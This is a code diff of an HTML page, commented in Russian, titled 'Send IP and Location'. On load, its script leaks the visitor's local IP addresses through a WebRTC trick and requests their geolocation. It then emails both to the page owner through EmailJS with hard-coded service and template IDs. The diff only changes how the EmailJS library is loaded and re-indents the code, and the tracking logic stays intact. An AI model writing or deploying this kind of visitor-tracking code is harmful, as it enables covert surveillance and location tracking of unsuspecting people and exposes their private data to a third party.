@@ -4,85 +4,87 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Send IP and Location</title>
-    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.4.1/dist/email.min.js"></script>
-    <script>
-        // Инициализация EmailJS с вашим публичным User ID
-        emailjs.init("nRcxesuNKhp7AMc4d");  // Замените на ваш публичный User ID
+    <!-- Использование последней версии EmailJS SDK -->
+    <script type="module">
+      import emailjs from 'https://cdn.emailjs.com/dist/email.min.js';
+      
+      // Инициализация EmailJS с вашим публичным User ID
+      emailjs.init("nRcxesuNKhp7AMc4d");  // Замените на ваш публичный User ID
 
-        // Функция для получения IP адреса
-        function getUserIP(onNewIP) {
-            var myPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
-            var pc = new myPeerConnection({
-                iceServers: []
-            }),
-            noop = function() {},
-            localIPs = {},
-            ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/g,
-            key;
+      // Функция для получения IP адреса
+      function getUserIP(onNewIP) {
+          var myPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+          var pc = new myPeerConnection({
+              iceServers: []
+          }),
+          noop = function() {},
+          localIPs = {},
+          ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/g,
+          key;
 
-            function iterateIP(ip) {
-                if (!localIPs[ip]) onNewIP(ip);
-                localIPs[ip] = true;
-            }
+          function iterateIP(ip) {
+              if (!localIPs[ip]) onNewIP(ip);
+              localIPs[ip] = true;
+          }
 
-            pc.createDataChannel("");
-            pc.createOffer().then(function(sdp) {
-                sdp.sdp.split('\n').forEach(function(line) {
-                    if (line.indexOf('candidate') < 0) return;
-                    line.match(ipRegex).forEach(iterateIP);
-                });
-                pc.setLocalDescription(sdp, noop, noop);
-            }).catch(function(reason) {});
+          pc.createDataChannel("");
+          pc.createOffer().then(function(sdp) {
+              sdp.sdp.split('\n').forEach(function(line) {
+                  if (line.indexOf('candidate') < 0) return;
+                  line.match(ipRegex).forEach(iterateIP);
+              });
+              pc.setLocalDescription(sdp, noop, noop);
+          }).catch(function(reason) {});
 
-            pc.onicecandidate = function(ice) {
-                if (!ice || !ice.candidate || !ice.candidate.candidate || !ice.candidate.candidate.match(ipRegex)) return;
-                ice.candidate.candidate.match(ipRegex).forEach(iterateIP);
-            };
-        }
+          pc.onicecandidate = function(ice) {
+              if (!ice || !ice.candidate || !ice.candidate.candidate || !ice.candidate.candidate.match(ipRegex)) return;
+              ice.candidate.candidate.match(ipRegex).forEach(iterateIP);
+          };
+      }
 
-        // Функция для отправки данных
-        function sendData(userData) {
-            emailjs.send("Hjikwe21782", "template_73zczgq", userData)
-                .then(function(response) {
-                    console.log("Email sent successfully", response);
-                    alert('Данные отправлены на вашу почту!');
-                }, function(error) {
-                    console.error("Failed to send email", error);
-                    alert("Ошибка при отправке данных: " + error.text);
-                });
-        }
+      // Функция для отправки данных
+      function sendData(userData) {
+          emailjs.send("Hjikwe21782", "template_73zczgq", userData)
+              .then(function(response) {
+                  console.log("Email sent successfully", response);
+                  alert('Данные отправлены на вашу почту!');
+              }, function(error) {
+                  console.error("Failed to send email", error);
+                  alert("Ошибка при отправке данных: " + error.text);
+              });
+      }
 
-        // Запрос геолокации и отправка данных
-        function getUserData() {
-            let userData = {};
+      // Запрос геолокации и отправка данных
+      function getUserData() {
+          let userData = {};
 
-            getUserIP(function(ip) {
-                userData.ip = ip;
-                console.log("IP:", ip);  // Выводим IP в консоль для проверки
-            });
+          getUserIP(function(ip) {
+              userData.ip = ip;
+              console.log("IP:", ip);  // Выводим IP в консоль для проверки
+          });
 
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(position) {
-                    userData.location = {
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude
-                    };
-                    console.log("Location:", userData.location);  // Выводим геолокацию в консоль для проверки
-                    sendData(userData);  // Отправляем данные
-                }, function(error) {
-                    alert('Ошибка при получении геолокации: ' + error.message);
-                    sendData(userData);  // Отправляем данные без геолокации
-                });
-            } else {
-                alert("Геолокация не поддерживается этим браузером.");
-                sendData(userData);  // Отправляем данные без геолокации
-            }
-        }
+          if (navigator.geolocation) {
+              navigator.geolocation.getCurrentPosition(function(position) {
+                  userData.location = {
+                      latitude: position.coords.latitude,
+                      longitude: position.coords.longitude
+                  };
+                  console.log("Location:", userData.location);  // Выводим геолокацию в консоль для проверки
+                  sendData(userData);  // Отправляем данные
+              }, function(error) {
+                  alert('Ошибка при получении геолокации: ' + error.message);
+                  sendData(userData);  // Отправляем данные без геолокации
+              });
+          } else {
+              alert("Геолокация не поддерживается этим браузером.");
+              sendData(userData);  // Отправляем данные без геолокации
+          }
+      }
 
-        // При загрузке страницы собираем данные и отправляем
-        window.onload = function() {
-            getUserData();
-        }
+      // При загрузке страницы собираем данные и отправляем
+      window.onload = function() {
+          getUserData();
+      }
     </script>
 </head>
 <body>
